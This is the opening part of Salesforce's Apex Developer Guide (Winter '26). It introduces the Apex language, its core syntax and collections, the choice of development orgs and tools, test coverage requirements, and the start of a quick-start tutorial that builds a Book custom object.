# Salesforce apex developer guide

> Source: https://resources.docs.salesforce.com/258/latest/en-us/sfdc/pdf/salesforce_apex_developer_guide.pdf

Fetched: 2025-12-17T18:45:02.875Z
Apex Developer Guide
Version 65.0, Winter ’26
Last updated: December 5, 2025

©
 Copyright 2000–2025 Salesforce, Inc. All rights reserved. Salesforce is a registered trademark of Salesforce, Inc., as are other
names and marks. Other marks appearing herein may be trademarks of their respective owners.

CONTENTS
Apex Developer Guide. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1
Release  Notes. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1
Getting  Started  with  Apex  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1
Introducing  Apex. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2
Apex Development Process. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11
Apex  Quick  Start. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16
Writing  Apex  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23
Data  Types  and  Variables. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23
Control Flow Statements. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 52
Classes,  Objects,  and  Interfaces. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 60
Working  with  Data  in  Apex. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 129
Document  Your  Apex  Code. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 243
Running  Apex. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 261
Invoking Apex. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 261
Apex  Transactions  and  Governor  Limits. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 343
Using  Salesforce  Features  with  Apex. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 357
Integration  and  Apex  Utilities. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 597
Debugging,  Testing,  and  Deploying  Apex. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 665
Debugging  Apex. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 665
Testing  Apex. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 704
Deploying  Apex. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 739
Distributing Apex Using Managed Packages. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 741
Apex  Reference. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 758
Appendices. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 758
Shipping Invoice Example. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 758
Reserved Keywords. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 769
Documentation  Typographical  Conventions. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 771

APEX DEVELOPER GUIDE
Apex is a strongly typed, object-oriented programming language that allows developers to execute flow and transaction control
statements on the Salesforce Platform server, in conjunction with calls to the API. This guide introduces you to the Apex development
process and provides valuable information on learning, writing, deploying and testing Apex.
For reference information on Apex classes, interfaces, exceptions and so on, see Apex Reference Guide.
Apex Release Notes
Use the Salesforce Release Notes to learn about the most recent updates and changes to Apex.
Getting Started with Apex
Learn about the Apex development lifecycle. Follow a step-by-step tutorial to create an Apex class and trigger, and deploy them to
a production organization.
Writing Apex
Apex is like Java for Salesforce. It enables you to add and interact with data in the Lightning Platform persistence layer. It uses classes,
data types, variables, and if-else statements. You can make it execute based on a condition, or have a block of code execute repeatedly.
Running Apex
You can access many features of the Salesforce user interface programmatically in Apex, and you can integrate with external SOAP
and REST Web services. You can run Apex code using a variety of mechanisms. Apex code runs in atomic transactions.
Debugging, Testing, and Deploying Apex
Develop your Apex code in a sandbox and debug it with the Developer Console and debug logs. Unit-test your code, then distribute
it to customers using packages.
Apex Reference
In Summer ’21 and later versions, Apex reference content is moved to a separate guide called the Apex Reference Guide.
Appendices
Apex Release Notes
Use the Salesforce Release Notes to learn about the most recent updates and changes to Apex.
For Apex updates and changes that impact the Salesforce Platform, see the Apex Release Notes.
For new and changed Apex classes, methods, exceptions and interfaces, see Apex: New and Changed Items in the Salesforce Release
Notes.
Getting Started with Apex
Learn about the Apex development lifecycle. Follow a step-by-step tutorial to create an Apex class and trigger, and deploy them to a
production organization.
1

Introducing Apex
Apex code is the first multitenant, on-demand programming language for developers interested in building the next generation of
business applications. Apex revolutionizes the way developers create on-demand applications.
Apex Development Process
In this chapter, you’ll learn about the Apex development lifecycle, and which organization and tools to use to develop Apex. You’ll
also learn about testing and deploying Apex code.
Apex Quick Start
This step-by-step tutorial shows how to create a simple Apex class and trigger, and how to deploy these components to a production
organization.
Introducing Apex
Apex code is the first multitenant, on-demand programming language for developers interested in building the next generation of
business applications. Apex revolutionizes the way developers create on-demand applications.
While many customization options are available through the Salesforce user interface, such as the ability to define new fields, objects,
workflow, and approval processes, developers can also use the SOAP API to issue data manipulation commands such as delete(),
update() or upsert(), from client-side programs.
These client-side programs, typically written in Java, JavaScript, .NET, or other programming languages, grant organizations more flexibility
in their customizations. However, because the controlling logic for these client-side programs is not located on Salesforce servers, they
are restricted by the performance costs of making multiple round-trips to the Salesforce site to accomplish common business transactions,
and by the cost and complexity of hosting server code, such as Java or .NET, in a secure and robust environment.
1.What is Apex?
Apex is a strongly typed, object-oriented programming language that allows developers to execute flow and transaction control
statements on Salesforce servers in conjunction with calls to the API. Using syntax that looks like Java and acts like database stored
procedures, Apex enables developers to add business logic to most system events, including button clicks, related record updates,
and Visualforce pages. Apex code can be initiated by Web service requests and from triggers on objects.
2.Understanding Apex Core Concepts
Apex code typically contains many things that you're familiar with from other programming languages.
3.When Should I Use Apex?
Salesforce provides the ability to customize prebuilt apps to fit your organization. For complex business processes, you can implement
custom functionality and user interfaces with a variety of tools, including Apex and Lightning Components.
4.How Does Apex Work?
All Apex runs entirely on-demand on the Lightning Platform. Developers write and save Apex code to the platform, and end users
trigger the execution of the Apex code via the user interface.
5.Developing Code in the Cloud
The Apex programming language is saved and runs in the cloud—the multitenant platform. Apex is tailored for data access and
data manipulation on the platform, and it enables you to add custom business logic to system events. While it provides many benefits
for automating business processes on the platform, it is not a general purpose programming language.
2
Introducing ApexApex Developer Guide

What is Apex?
Apex is a strongly typed, object-oriented programming language that allows developers to execute flow and transaction control
statements on Salesforce servers in conjunction with calls to the API. Using syntax that looks like Java and acts like database stored
procedures, Apex enables developers to add business logic to most system events, including button clicks, related record updates, and
Visualforce pages. Apex code can be initiated by Web service requests and from triggers on objects.
You can add Apex to most system events.
As a language, Apex is:
Integrated
Apex provides built-in support for common Lightning Platform idioms, including:
•
Data manipulation language (DML) calls, such as INSERT, UPDATE, and DELETE, that include built-in DmlException
handling
•
Inline Salesforce Object Query Language (SOQL) and Salesforce Object Search Language (SOSL) queries that return lists of sObject
records
•
Looping that allows for bulk processing of multiple records at a time
•
Locking syntax that prevents record update conflicts
•
Custom public API calls that can be built from stored Apex methods
•
Warnings and errors issued when a user tries to edit or delete a custom object or field that is referenced by Apex
3
Introducing ApexApex Developer Guide

Easy to use
Apex is based on familiar Java idioms, such as variable and expression syntax, block and conditional statement syntax, loop syntax,
object and array notation. Where Apex introduces new elements, it uses syntax and semantics that are easy to understand and
encourage efficient use of the Lightning Platform. Therefore, Apex produces code that is both succinct and easy to write.
Data focused
Apex is designed to thread together multiple query and DML statements into a single unit of work on the Salesforce server. Developers
use database stored procedures to thread together multiple transaction statements on a database server in a similar way. Like other
database stored procedures, Apex does not attempt to provide general support for rendering elements in the user interface.
Rigorous
Apex is a strongly typed language that uses direct references to schema objects such as object and field names. It fails quickly at
compile time if any references are invalid. It stores all custom field, object, and class dependencies in metadata to ensure that they
are not deleted while required by active Apex code.
Hosted
Apex is interpreted, executed, and controlled entirely by the Lightning Platform.
Multitenant aware
Like the rest of the Lightning Platform, Apex runs in a multitenant environment. So, the Apex runtime engine is designed to guard
closely against runaway code, preventing it from monopolizing shared resources. Any code that violates limits fails with
easy-to-understand error messages.
Easy to test
Apex provides built-in support for unit test creation and execution. It includes test results that indicate how much code is covered,
and which parts of your code could be more efficient. Salesforce ensures that all custom Apex code works as expected by executing
all unit tests prior to any platform upgrades.
Versioned
You can save your Apex code against different versions of the API. This enables you to maintain behavior.
Apex is included in Performance Edition, Unlimited Edition, Developer Edition, Enterprise Edition, and Database.com.
Understanding Apex Core Concepts
Apex code typically contains many things that you're familiar with from other programming languages.
4
Introducing ApexApex Developer Guide

Programming elements in Apex
The section describes the basic functionality of Apex, as well as some of the core concepts.
Using Version Settings
In the Salesforce user interface you can specify a version of the Salesforce API against which to save your Apex class or trigger. This setting
indicates not only the version of SOAP API to use, but which version of Apex as well. You can change the version after saving. Every class
or trigger name must be unique. You can’t save the same class or trigger against different versions.
You can also use version settings to associate a class or trigger with a particular version of a managed package that is installed in your
organization from AppExchange. This version of the managed package continues to be used by the class or trigger if later versions of
the managed package are installed, unless you manually update the version setting. To add an installed managed package to the settings
list, select a package from the list of available packages. The list is only displayed if you have an installed managed package that is not
already associated with the class or trigger.
For more information about using version settings with managed packages, see About Package Versions in Salesforce Help.
5
Introducing ApexApex Developer Guide

Naming Variables, Methods and Classes
You can’t use any of the Apex reserved keywords when naming variables, methods, or classes. These include words that are part of Apex
and the Lightning Platform, such as list, test, or account, as well as reserved keywords.
Using Variables and Expressions
Apex is a strongly-typed language, that is, you must declare the data type of a variable when you first refer to it. Apex data types include
basic types such as Integer, Date, and Boolean, as well as more advanced types such as lists, maps, objects, and sObjects.
Variables are declared with a name and a data type. You can assign a value to a variable when you declare it. You can also assign values
later. Use the following syntax when declaring variables:
datatypevariable_name[ =value];
Tip:  The semi-colon at the end of preceding codeblock is not optional. You must end all statements with a semi-colon.
The following are examples of variable declarations:
// The followingvariablehas the datatypeof Integerwiththe nameCount,
// and has the valueof 0.
IntegerCount= 0;
// The followingvariablehas the datatypeof Decimalwiththe nameTotal.Note
// thatno valuehas beenassignedto it.
DecimalTotal;
// The followingvariableis an account,whichis alsoreferredto as an sObject.
AccountMyAcct= new Account();
In Apex, all primitive data type arguments, such as Integer or String, are passed into methods by value. This fact means that any changes
to the arguments exist only within the scope of the method. When the method returns, the changes to the arguments are lost.
Non-primitive data type arguments, such as sObjects, are passed into methods by reference. Therefore, when the method returns, the
passed-in argument still references the same object as before the method call. Within the method, the reference can't be changed to
point to another object, but the values of the object's fields can be changed.
Using Statements
A statement is any coded instruction that performs an action.
In Apex, statements must end with a semicolon and can be one of these types:
•
Assignment, such as assigning a value to a variable
•
Conditional (if-else)
•
Loops:
–
Do-while
–
While
–
For
•
Locking
•
Data Manipulation Language (DML)
•
Transaction Control
•
Method Invoking
•
Exception Handling
6
Introducing ApexApex Developer Guide

A block is a series of statements that are grouped with curly braces and can be used in any place where a single statement is allowed.
For example:
if (true) {
System.debug(1);
System.debug(2);
} else{
System.debug(3);
System.debug(4);
}
In cases where a block consists of only one statement, the curly braces can be left off. For example:
if (true)
System.debug(1);
else
System.debug(2);
Using Collections
Apex has the following types of collections:
•
Lists (arrays)
•
Maps
•
Sets
A list is a collection of elements, such as Integers, Strings, objects, or other collections. Use a list when the sequence of elements is
important. You can have duplicate elements in a list.
The first index position in a list is always 0.
To create a list:
•
Use the new keyword
•
Use the List keyword followed by the element type contained within <> characters.
Use the following syntax for creating a list:
List<datatype>list_name
[= new List<datatype>();]|
[=new List<datatype>{value[,value2. . .]};]|
;
The following example creates a list of Integer, and assigns it to the variable My_List. Remember, because Apex is strongly typed,
you must declare the data type of My_List as a list of Integer.
List<Integer> My_List= new List<Integer>();
For more information, see Lists on page 28.
A set is a collection of unique, unordered elements. It can contain primitive data types, such as String, Integer, Date, and so on. It can
also contain more complex data types, such as sObjects.
To create a set:
•
Use the new keyword
•
Use the Set keyword followed by the primitive data type contained within <> characters
7
Introducing ApexApex Developer Guide

Use the following syntax for creating a set:
Set<datatype>set_name
[= new Set<datatype>();]|
[= new Set<datatype>{value[,value2. . .] };] |
;
The following example creates a set of String. The values for the set are passed in using the curly braces {}.
Set<String> My_String= new Set<String>{'a', 'b', 'c'};
For more information, see Sets on page 31.
A map is a collection of key-value pairs. Keys can be any primitive data type. Values can include primitive data types, as well as objects
and other collections. Use a map when finding something by key matters. You can have duplicate values in a map, but each key must
be unique.
To create a map:
•
Use the new keyword
•
Use the Map keyword followed by a key-value pair, delimited by a comma and enclosed in <> characters.
Use the following syntax for creating a map:
Map<key_datatype,value_datatype>map_name
[=new Map<key_datatype,value_datatype>();]|
[=new Map<key_datatype,value_datatype>
{key1_value=>value1_value
[,key2_value=>value2_value. . .]};]|
;
The following example creates a map that has a data type of Integer for the key and String for the value. In this example, the values for
the map are being passed in between the curly braces {} as the map is being created.
Map<Integer, String> My_Map= new Map<Integer, String>{1 => 'a', 2 => 'b', 3 => 'c'};
For more information, see Maps on page 31.
Using Branching
An if statement is a true-false test that enables your application to do different things based on a condition. The basic syntax is as
follows:
if (Condition){
// Do thisif the conditionis true
} else{
// Do thisif the conditionis not true
}
For more information, see Conditional (If-Else) Statements on page 53.
Using Loops
While the if statement enables your application to do things based on a condition, loops tell your application to do the same thing
again and again based on a condition. Apex supports the following types of loops:
•
Do-while
8
Introducing ApexApex Developer Guide

•
While
•
For
A Do-while loop checks the condition after the code has executed.
A While loop checks the condition at the start, before the code executes.
A For loop enables you to more finely control the condition used with the loop. In addition, Apex supports traditional For loops where
you set the conditions, as well as For loops that use lists and SOQL queries as part of the condition.
For more information, see Loops on page 57.
When Should I Use Apex?
Salesforce provides the ability to customize prebuilt apps to fit your organization. For complex business processes, you can implement
custom functionality and user interfaces with a variety of tools, including Apex and Lightning Components.
Apex
Use Apex if you want to:
•
Create Web services.
•
Create email services.
•
Perform complex validation over multiple objects.
•
Create complex business processes that aren’t supported by Flow Builder.
•
Create custom transactional logic (logic that occurs over the entire transaction, not just with a single record or object).
•
Attach custom logic to another operation, such as saving a record, so that it occurs whenever the operation is executed, regardless
of whether it originates in the user interface, a Visualforce page, or from SOAP API.
Lightning Components
Develop Lightning components to customize Lightning Experience, the Salesforce mobile app, or to build your own standalone apps.
You can also use out-of-the-box components to speed up development.
As of Spring ’19 (API version 45.0), you can build Lightning components using two programming models: the Lightning Web Components
model, and the original Aura Components model. Lightning web components are custom HTML elements built using HTML and modern
JavaScript. Lightning web components and Aura components can coexist and interoperate on a page. Configure Lightning web
components and Aura components to work in Lightning App Builder and Experience Builder. Admins and end users don’t know which
programming model was used to develop the components. To them, they’re simply Lightning components.
We recommend using the Lightning Web Components (LWC) model to create custom user interfaces. LWC follows W3C web standards,
and you can build and package components using standard JavaScript syntax. With LWC, you can work easily with Salesforce data using
Apex and Lightning Data Service.
For more information, see the LWC Dev Guide.
Visualforce
Visualforce consists of a tag-based markup language that gives developers a more powerful way of building applications and customizing
the Salesforce user interface. With Visualforce you can:
•
Build wizards and other multistep processes.
•
Create your own custom flow control through an application.
9
Introducing ApexApex Developer Guide

•
Define navigation patterns and data-specific rules for optimal, efficient application interaction.
For more information, see the Visualforce Developer's Guide.
SOAP API
Use standard SOAP API calls when you want to add functionality to a composite application that processes only one type of record at a
time and does not require any transactional control (such as setting a Savepoint or rolling back changes).
For more information, see the SOAP API Developer Guide.
How Does Apex Work?
All Apex runs entirely on-demand on the Lightning Platform. Developers write and save Apex code to the platform, and end users trigger
the execution of the Apex code via the user interface.
Apex is compiled, stored, and run entirely on the Lightning Platform
When a developer writes and saves Apex code to the platform, the platform application server first compiles the code into an abstract
set of instructions that can be understood by the Apex runtime interpreter, and then saves those instructions as metadata.
When an end user triggers the execution of Apex, perhaps by clicking a button or accessing a Visualforce page, the platform application
server retrieves the compiled instructions from the metadata and sends them through the runtime interpreter before returning the
result. The end user observes no differences in execution time from standard platform requests.
Developing Code in the Cloud
The Apex programming language is saved and runs in the cloud—the multitenant platform. Apex is tailored for data access and data
manipulation on the platform, and it enables you to add custom business logic to system events. While it provides many benefits for
automating business processes on the platform, it is not a general purpose programming language.
Apex cannot be used to:
•
Render elements in the user interface other than error messages
•
Change standard functionality—Apex can only prevent the functionality from happening, or add additional functionality
•
Create temporary files
•
Spawn threads
Tip: All Apex code runs on the Lightning Platform, which is a shared resource used by all other organizations. To guarantee
consistent performance and scalability, the execution of Apex is bound by governor limits that ensure no single Apex execution
impacts the overall service of Salesforce. This means all Apex code is limited by the number of operations (such as DML or SOQL)
that it can perform within one process.
10
Introducing ApexApex Developer Guide

All Apex requests return a collection that contains from 1 to 50,000 records. You cannot assume that your code only works on a
single record at a time. Therefore, you must implement programming patterns that take bulk processing into account. If you don’t,
you may run into the governor limits.
SEE ALSO:
Trigger and Bulk Request Best Practices
Apex Development Process
In this chapter, you’ll learn about the Apex development lifecycle, and which organization and tools to use to develop Apex. You’ll also
learn about testing and deploying Apex code.
What is the Apex Development Process?
To develop Apex, get a Developer Edition account, write and test your code, then deploy your code.
Choose a Salesforce Org for Apex Development
You can develop Apex in a sandbox, scratch org, or Developer Edition org, but not directly in a production org. With so many choices,
here’s some help to determine which org type is right for you and how to create it.
Choose a Development Environment for Writing Apex
There are several development environments for developing Apex code. Choose the environment that meets your needs.
Learning Apex
After you have your developer account, there are many resources available to you for learning about Apex
Writing Tests
Testing is the key to successful long-term development and is a critical component of the development process. We strongly
recommend that you use a test-driven development process, that is, test development that occurs at the same time as code
development.
Deploying Apex to a Sandbox Organization
Sandboxes create copies of your Salesforce org in separate environments. Use them for development, testing, and training without
compromising the data and applications in your production org. Sandboxes are isolated from your production org, so operations
that you perform in your sandboxes don’t affect your production org.
Deploy Apex to a Salesforce Production Organization
After you’ve finished all of your unit tests and verified that your Apex code is executing properly, the final step is deploying Apex to
your Salesforce production organization.
Adding Apex Code to a AppExchange App
You can include an Apex class or trigger in an app that you’re creating for AppExchange.
What is the Apex Development Process?
To develop Apex, get a Developer Edition account, write and test your code, then deploy your code.
We recommend the following process for developing Apex:
1.Choose a Salesforce Org for Apex development.
2.Learn more about Apex.
3.Write your Apex.
11
Apex Development ProcessApex Developer Guide

4.While writing Apex, you should also be writing tests.
5.Optionally deploy your Apex to a sandbox organization and do final unit tests.
6.Deploy your Apex to your Salesforce production organization.
In addition to deploying your Apex, once it is written and tested, you can also add your classes and triggers to a AppExchange App
package.
Choose a Salesforce Org for Apex Development
You can develop Apex in a sandbox, scratch org, or Developer Edition org, but not directly in a production org. With so many choices,
here’s some help to determine which org type is right for you and how to create it.
Sandboxes (Recommended)
A sandbox is a copy of your production org’s metadata in a separate environment, with varying amounts of data depending on the
sandbox type. A sandbox provides a safe space for developers and admins to experiment with new features and validate changes before
deploying code to production. Developer and Developer Pro sandboxes with source tracking enabled can take advantage of many of
the features of our Salesforce DX source-driven development tools, including Salesforce CLI, Code Builder, and DevOps Center. See Create
a Sandbox in Salesforce Help.
Scratch Orgs (Recommended)
A scratch org is a source-driven and temporary deployment of Salesforce code and metadata. A scratch org is fully configurable, allowing
you to emulate different Salesforce editions with different features and settings. Scratch orgs have a maximum 30-day lifespan, with the
default set at 7 days. For information on using and creating scratch orgs, see Scratch Orgs in the Salesforce DX Developer Guide.
Developer Edition (DE) Orgs
A DE org is a free org that provides access to many of the features available in an Enterprise Edition org. Developer Edition orgs can
become out-of-date over time and have limited storage. Developer Edition orgs don’t have source tracking enabled and can’t be used
as development environments in DevOps Center. Developer Edition orgs expire if they aren't logged into regularly. You can sign up for
as many Developer Edition orgs as you like on the Developer Edition Signup page.
Trial Edition Orgs
Trial editions usually expire after 30 days, so they’re great for evaluating Salesforce functionality but aren’t intended for use as a permanent
development environment. Although Apex triggers are available in trial editions, they’re disabled when you convert to any other edition.
Deploy your code to another org before conversion to retain your Apex triggers. Salesforce offers several product- and industry-specific
free trial orgs.
Production Orgs (Not Supported)
A production org is the final destination for your code and applications, and has live users accessing your data. You can't develop Apex
in your Salesforce production org, and we recommend that you avoid directly modifying any code or metadata directly in production.
Live users accessing the system while you're developing can destabilize your data or corrupt your application.
Choose a Development Environment for Writing Apex
There are several development environments for developing Apex code. Choose the environment that meets your needs.
12
Apex Development ProcessApex Developer Guide

Agentforce for Developers
Agentforce for Developers is an AI-powered developer tool that generates Apex code from natural language prompts and automatically
suggests code completions as you type. Use Agentforce for Developers to easily create unit test cases for your Apex code and get to the
required Apex test coverage.
Agentforce for Developers extension (salesforcedx-einstein-gpt) is a part of the Salesforce Expanded Pack. Agentforce for Developers is
enabled by default in VS Code. For more information, see Set Up Agentforce for Developers.
•
To access Agentforce for Developers from inside an Apex file in the VS Code editor, see Generate Apex Code.
•
To use AI-based autocomplete to accept suggestions for Apex code as you write it, see Inline Auto Completion.
•
To use Agentforce for Developers to quickly generate unit tests, see Test Case Generation.
Salesforce Extensions for Visual Studio Code and Code Builder
The Salesforce Extensions for Visual Studio Code and Code Builder are tools for developing on the Salesforce platform in the lightweight,
extensible VS Code editor. These tools provide features for working with development orgs (scratch orgs, sandboxes, and developer
edition orgs), Apex, Lightning components, and Visualforce.
Code Builder is a browser-based version of the desktop experience, with everything installed and configured. It provides all the goodness
of the desktop experience, but provides you with the flexibility to work anywhere, from any computer.
Developer Console
The Developer Console is an integrated development environment (IDE) built into Salesforce. Use it to create, debug, and test Apex
classes and triggers.
To open the Developer Console from Lightning Experience: Click the quick access menu (), then click Developer Console.
To open the Developer Console from Salesforce Classic: Click YourName > Developer Console.
The Developer Console supports these tasks:
•
Writing code—You can add code using the source code editor. Also, you can browse packages in your organization.
•
Compiling code—When you save a trigger or class, the code is automatically compiled. Any compilation errors are reported.
•
Debugging—You can view debug logs and set checkpoints that aid in debugging.
•
Testing—You can execute tests of specific test classes or all tests in your organization, and you can view test results. Also, you can
inspect code coverage.
•
Checking performance—You can inspect debug logs to locate performance bottlenecks.
•
SOQL queries—You can query data in your organization and view the results using the Query Editor.
•
Color coding and autocomplete—The source code editor uses a color scheme for easier readability of code elements and provides
autocompletion for class and method names.
Salesforce Setup Code Editors
In Salesforce Setup, you can view and edit Apex classes and triggers.
All classes and triggers are compiled when they’re saved, and any syntax errors are flagged. You can’t save your code until it compiles
without errors. The Salesforce user interface also numbers the lines in the code, and uses color coding to distinguish different elements,
such as comments, keywords, literal strings, and so on.
•
From Setup in the Quick Find box, enter Apex, and select an Apex class or trigger. To edit it, click Edit beside the class or trigger
name.
13
Apex Development ProcessApex Developer Guide

•
To create a trigger on an object, from Setup in the Quick Find box, enter Object and click Object Manager. Click the object name
and click Triggers. Click New and enter your code.
Note:  You can’t use the Salesforce Setup code editors to modify Apex in a Salesforce production org.
Additional Editors
Alternatively, you can use any text editor, such as Notepad, to write Apex code. Then either copy and paste the code into your application,
or use one of the API calls to deploy it.
To develop an Apex IDE of your own, use SOAP API methods for compiling triggers and classes, and executing test methods. Use Metadata
API methods for deploying code to production environments. For more information, see Deploying Apex on page 739.
SEE ALSO:
Salesforce Help: Find Object Management Settings
Learning Apex
After you have your developer account, there are many resources available to you for learning about Apex
Apex Trailhead Content
Beginning and intermediate programmers
Several Trailhead modules provide tutorials on learning Apex. Use these modules to learn the fundamentals of Apex and how you can
use it on the Salesforce Platform. Use Apex to add custom business logic through triggers, unit tests, asynchronous Apex, REST Web
services, and Lightning components.
•
Quick Start: Apex
•
Apex Basics & Database
•
Apex Triggers
•
Apex Integration Services
•
Apex Testing
•
Asynchronous Apex
Salesforce Developers Apex Developer Center
Beginning and advanced programmers
The Apex Developer Center has links to several resources including articles about the Apex programming language. These resources
provide a quick introduction to Apex and include best practices for Apex development.
Code Samples and SDKs
Beginning and advanced programmers
Open-source code samples and SDKs, reference code, and best practices can be found at Code samples and SDKs. A library of concise,
meaningful examples of Apex code for common use cases, following best practices, can be found at Apex-recipes.
14
Apex Development ProcessApex Developer Guide

Training Courses
Training classes are also available from Salesforce Trailhead Academy. Grow and validate your skills with Salesforce Credentials.
In This Guide (Apex Developer Guide)
Beginning programmers can look at the following:
•
Introducing Apex, and in particular:
–
Documentation Conventions
–
Core Concepts
–
Quick Start Tutorial
•
Classes, Objects, and Interfaces
•
Testing Apex
•
Execution Governors and Limits
In addition, advanced programmers can look at:
•
Trigger and Bulk Request Best Practices
•
Advanced Apex Programming Example
•
Understanding Apex Describe Information
•
Asynchronous Execution (@future Annotation)
•
Batch Apex and Apex Scheduler
Writing Tests
Testing is the key to successful long-term development and is a critical component of the development process. We strongly recommend
that you use a test-driven development process, that is, test development that occurs at the same time as code development.
To facilitate the development of robust, error-free code, Apex supports the creation and execution of unit tests. Unit tests are class
methods that verify whether a particular piece of code is working properly. Unit test methods take no arguments, commit no data to
the database, and send no emails. Such methods are flagged with the @IsTest annotation in the method definition. Unit test methods
must be defined in test classes, that is, classes annotated with @IsTest.
Note:  The @IsTest annotation on methods is equivalent to the testMethod keyword. As best practice, Salesforce
recommends that you use @IsTest rather than testMethod. The testMethod keyword may be versioned out in a future
release.
In addition, before you deploy Apex or package it for the AppExchange, the following must be true.
•
Unit tests must cover at least 75% of your Apex code, and all of those tests must complete successfully.
Note the following.
–
When deploying Apex to a production organization, each unit test in your organization namespace is executed by default.
–
Calls to System.debug aren’t counted as part of Apex code coverage.
–
Test methods and test classes aren’t counted as part of Apex code coverage.
–
While only 75% of your Apex code must be covered by tests, don’t focus on the percentage of code that is covered. Instead,
make sure that every use case of your application is covered, including positive and negative cases, as well as bulk and single
records. This approach ensures that 75% or more of your code is covered by unit tests.
•
Every trigger must have some test coverage.
15
Apex Development ProcessApex Developer Guide

•
All classes and triggers must compile successfully.
For more information on writing tests, see Testing Apex on page 704.
Deploying Apex to a Sandbox Organization
Sandboxes create copies of your Salesforce org in separate environments. Use them for development, testing, and training without
compromising the data and applications in your production org. Sandboxes are isolated from your production org, so operations that
you perform in your sandboxes don’t affect your production org.
To deploy Apex from a local project in the Salesforce extension for Visual Studio Code to a Salesforce organization, see Salesforce
Extensions for Visual Studio Code.
You can also use the deploy() Metadata API call to deploy your Apex from a developer organization to a sandbox organization.
A useful API call is runTests(). In a development or sandbox organization, you can run the unit tests for a specific class, a list of
classes, or a namespace.
You can also use Salesforce CLI. See Develop Against Any Org for details.
For more information, see Deploying Apex.
Deploy Apex to a Salesforce Production Organization
After you’ve finished all of your unit tests and verified that your Apex code is executing properly, the final step is deploying Apex to your
Salesforce production organization.
1.To deploy Apex from a local project in Visual Studio Code editor to a Salesforce organization, see Salesforce Extensions for Visual
Studio Code and Code Builder.
Also, you can deploy Apex through change sets in the Salesforce user interface. For more information and for additional deployment
options, see Deploying Apex on page 739, and Build and Release Your App.
Adding Apex Code to a AppExchange App
You can include an Apex class or trigger in an app that you’re creating for AppExchange.
Any Apex that is included as part of a package must have at least 75% cumulative test coverage. Each trigger must also have some test
coverage. When you upload your package to AppExchange, all tests are run to ensure that they run without errors. In addition, tests
with the@isTest(OnInstall=true) annotation run when the package is installed in the installer's organization. You can specify
which tests should run during package install by annotating them with @isTest(OnInstall=true). This subset of tests must
pass for the package install to succeed.
For more information, see the Second-Generation Managed Packaging Developer Guide.
Apex Quick Start
This step-by-step tutorial shows how to create a simple Apex class and trigger, and how to deploy these components to a production
organization.
When you have a Developer Edition or sandbox organization, you can learn some of the core concepts of Apex. After reviewing the
basics, you’re ready to write your first Apex program—a simple class, trigger, and unit test.
Because Apex is similar to Java, you can recognize much of the functionality.
This tutorial is based on a custom object called Book that is created in the first step. This custom object is updated through a trigger.
16
Apex Quick StartApex Developer Guide

This Hello World sample requires custom objects. You can either create these objects on your own, or download the objects and Apex
code as an unmanaged package from AppExchange. To obtain the sample assets in your org, install the Apex Tutorials Package. This
package also contains sample code and objects for the Shipping Invoice example.
Note:  There’s a more complex Shipping Invoice example that you can also walk through. That example illustrates many more
features of the language.
1.Create a Custom Object
In this step, you create a custom object called Book with one custom field called Price.
2.Add an Apex Class
In this step, you add an Apex class that contains a method for updating the book price. This method is called by the trigger that
you’ll be adding in the next step.
3.Add an Apex Trigger
In this step, you create a trigger for the Book__c custom object that calls the applyDiscount method of the MyHelloWorld
class that you created in the previous step.
4.Add a Test Class
In this step, you add a test class with one test method. You also run the test and verify code coverage. The test method exercises
and validates the code in the trigger and class. Also, it enables you to reach 100% code coverage for the trigger and class.
5.Deploy Components to Production
In this step, you deploy the Apex code and the custom object you created previously to your production organization using change
sets.
Create a Custom Object
In this step, you create a custom object called Book with one custom field called Price.
Prerequisites:
A Salesforce account in a sandbox Professional, Enterprise, Performance, or Unlimited Edition org, or an account in a Developer org.
For more information about creating a sandbox org, see “Sandbox Types and Templates” in Salesforce Help. To sign up for a free Developer
org, see the Developer Edition Environment Sign Up Page.
1.Log in to your sandbox or Developer org.
2.From your management settings for custom objects, if you’re using Salesforce Classic, click New Custom Object, or if you’re using
Lightning Experience, select Create > Custom Object.
3.Enter Book for the label.
4.Enter Books for the plural label.
5.Click Save.
Ta dah! You’ve now created your first custom object. Now let’s create a custom field.
6.In the Custom Fields & Relationships section of the Book detail page, click New.
7.Select Number for the data type and click Next.
8.Enter Price for the field label.
9.Enter 16 in the length text box.
10.Enter 2 in the decimal places text box, and click Next.
